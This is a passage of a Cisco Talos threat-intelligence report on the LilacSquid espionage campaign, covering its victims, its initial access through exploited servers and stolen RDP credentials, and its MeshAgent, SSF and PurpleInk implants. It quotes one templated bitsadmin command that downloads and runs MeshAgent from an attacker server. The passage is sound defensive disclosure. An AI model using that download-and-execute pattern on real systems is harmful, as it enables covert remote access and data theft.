---
title: LilacSquid: The stealthy trilogy of PurpleInk, InkBox and InkLoader
url: https://blog.talosintelligence.com/lilacsquid/
source: Over Security - Cybersecurity news aggregator
date: 2024-05-31
fetch_date: 2025-10-06T16:51:56.832962
---

# LilacSquid: The stealthy trilogy of PurpleInk, InkBox and InkLoader

# Cisco Talos Blog

[ ]

* [Intelligence Center](https://talosintelligence.com/reputation)

  [ ]

  + [# Intelligence Center](https://talosintelligence.com/reputation)
  + BACK
  + [Intelligence Search](https://talosintelligence.com/reputation_center)
  + [Email & Spam Trends](https://talosintelligence.com/reputation_center/email_rep)
* [Vulnerability Research](https://talosintelligence.com/vulnerability_info)

  [ ]

  + [# Vulnerability Research](https://talosintelligence.com/vulnerability_info)
  + BACK
  + [Vulnerability Reports](https://talosintelligence.com/vulnerability_reports)
  + [Microsoft Advisories](https://talosintelligence.com/ms_advisories)
* [Incident Response](https://talosintelligence.com/incident_response)

  [ ]

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](https://talosintelligence.com/incident_response/services#reactive-services)
  + [Proactive Services](https://talosintelligence.com/incident_response/services#proactive-services)
  + [Emergency Support](https://talosintelligence.com/incident_response/contact)
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  [ ]

  # Security Resources

  + BACK

  Security Resources
  + [Open Source Security Tools](https://talosintelligence.com/software)
  + [Intelligence Categories Reference](https://talosintelligence.com/categories)
  + [Secure Endpoint Naming Reference](https://talosintelligence.com/secure-endpoint-naming)
* Media

  [ ]

  # Media

  + BACK

  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](https://talosintelligence.com/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](https://talosintelligence.com/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  [ ]

  # Company

  + BACK

  Company
  + [About Talos](https://talosintelligence.com/about)
  + [Careers](https://talosintelligence.com/careers)

![](/content/images/2024/05/lilac-squid-header.jpg)

# LilacSquid: The stealthy trilogy of PurpleInk, InkBox and InkLoader

By
[Asheer Malhotra](https://blog.talosintelligence.com/author/asheer-malhotra/)

Thursday, May 30, 2024 08:01

[APT](/category/apt/)
[malware](/category/malware/)

*By Anna Bennett, Nicole Hoffman, Asheer Malhotra, Sean Taylor and Brandon White.*

* Cisco Talos is disclosing a new suspected data theft campaign, active since at least 2021, we attribute to an advanced persistent threat actor (APT) we’re calling “LilacSquid.”
* LilacSquid’s victimology includes a diverse set of victims consisting of information technology organizations building software for the research and industrial sectors in the United States, organizations in the energy sector in Europe and the pharmaceutical sector in Asia indicating that the threat actor (TA) may be agnostic of industry verticals and trying to steal data from a variety of sources.
* This campaign uses MeshAgent, an open-source remote management tool, and a customized version of QuasarRAT we’re calling “PurpleInk” to serve as the primary implants after successfully compromising vulnerable application servers exposed to the internet.
* This campaign leverages vulnerabilities in public-facing application servers and compromised remote desktop protocol (RDP) credentials to orchestrate the deployment of a variety of open-source tools, such as MeshAgent and SSF, alongside customized malware, such as "PurpleInk," and two malware loaders we are calling "InkBox" and "InkLoader.”
* The campaign is geared toward establishing long-term access to compromised victim organizations to enable LilacSquid to siphon data of interest to attacker-controlled servers.

# LilacSquid – An espionage-motivated threat actor

Talos assesses with high confidence that this campaign has been active since at least 2021 and the successful compromise and post-compromise activities are geared toward establishing long-term access for data theft by an advanced persistent threat (APT) actor we are tracking as "LilacSquid" and UAT-4820. Talos has observed at least three successful compromises spanning entities in Asia, Europe and the United States consisting of industry verticals such as pharmaceuticals, oil and gas, and technology.

Previous intrusions into software manufacturers, such as the [3CX](http://3cx/) and [X\_Trader](https://thehackernews.com/2023/04/lazarus-xtrader-hack-impacts-critical.html) compromises by Lazarus, indicate that unauthorized long-term access to organizations that manufacture and distribute popular software for enterprise and industrial organizations can open avenues of supply chain compromise proving advantageous to threat actors such as LilacSquid, allowing them to widen their net of targets.

We have observed two different types of initial access techniques deployed by LilacSquid, including exploiting vulnerabilities and the use of compromised remote desktop protocol (RDP) credentials. Post-exploitation activity in this campaign consists of the deployment of MeshAgent, an open-source remote management and desktop session application, and a heavily customized version of QuasarRAT that we track as “PurpleInk” allowing LilacSquid to gain complete control over the infected systems. Additional means of persistence used by LilacSquid include the use of open-source tools such as Secure Socket Funneling (SSF), which is a tool for proxying and tunneling multiple sockets through a single secure TLS tunnel to a remote computer.

It is worth noting that multiple tactics, techniques, tools and procedures (TTPs) utilized in this campaign bear some overlap with North Korean APT groups, such as [Andariel and its parent umbrella group, Lazarus](https://blog.talosintelligence.com/lazarus_new_rats_dlang_and_telegram/). Public reporting has noted Andariel’s use of [MeshAgent](https://asec.ahnlab.com/en/63192/) as a tool for maintaining post-compromise access after successful exploitation. Furthermore, Talos has observed Lazarus extensively use SOCKs proxy and tunneling tools, along with custom-made malware as part of their post-compromise [playbooks to act as channels of secondary access and exfiltration](https://blog.talosintelligence.com/lazarus-three-rats/). This tactic has also been seen in this campaign operated by LilacSquid where the threat actor deployed SSF along with other malware to create tunnels to their remote servers.

# LilacSquid’s infection chains

There are primarily two types of infection chains that LilacSquid uses in this campaign. The first involves the successful exploitation of a vulnerable web application, while the other is the use of compromised RDP credentials. Successful compromise of a system leads to LilacSquid deploying multiple vehicles of access onto compromised hosts, including dual-use tools such as [MeshAgent](https://meshcentral.com/), [Secure Socket Funneling (SSF)](https://github.com/securesocketfunneling/ssf), InkLoader and PurpleInk.

Successful exploitation of the vulnerable application results in the attackers deploying a script that will set up working directories for the malware and then download and execute MeshAgent from a remote server. On execution, MeshAgent will connect to its C2, carry out preliminary reconnaissance and begin downloading and activating other implants on the system, such as SSF and PurpleInk.

MeshAgent is typically downloaded by the attackers using the bitsadmin utility and then executed to establish contact with the C2:

bitsadmin /transfer -job\_name- /download /priority normal -remote\_URL- -local\_path\_for\_MeshAgent-
-local\_path\_for\_MeshAgent- connect
![](https://blog.talosintelligence.com/content/images/2024/05/data-src-image-b1903d40-9045-4abf-8642-683eac6843d4.jpeg)

## Instrumenting InkLoader – Modularizing the infection ...